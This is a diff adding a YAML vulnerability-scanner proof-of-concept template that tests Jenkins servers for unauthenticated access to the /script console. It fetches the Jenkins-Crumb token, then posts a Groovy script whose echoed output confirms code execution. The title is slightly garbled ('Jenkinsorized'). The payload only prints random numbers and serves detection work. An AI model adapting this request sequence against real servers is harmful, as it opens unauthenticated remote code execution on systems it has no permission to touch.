@@ -1,0 +1,34 @@
+id: poc-yaml-jenkins-unauthorized-access
+info:
+  name: Jenkinsorized Access 未授权访问漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 访问控制错误
+  finger: Jenkins
+  reference: []
+  description: null
+variables:
+  r1: random_int(1000, 9999)
+  r2: random_int(1000, 9999)
+transport: http
+requests:
+- method: GET
+  path: /script
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200
+  output:
+  - regex_match(body,"\"Jenkins-Crumb\", \"(?P<var>.+?)\"\\);")
+- method: POST
+  path: /script
+  headers: {}
+  data: script=printf%28%27{{.r1}}%25%25{{.r2}}%27%29%3B&Jenkins-Crumb={{.var}}&Submit=%E8%BF%90%E8%A1%8C
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 + "%" + r2)
+  output: []
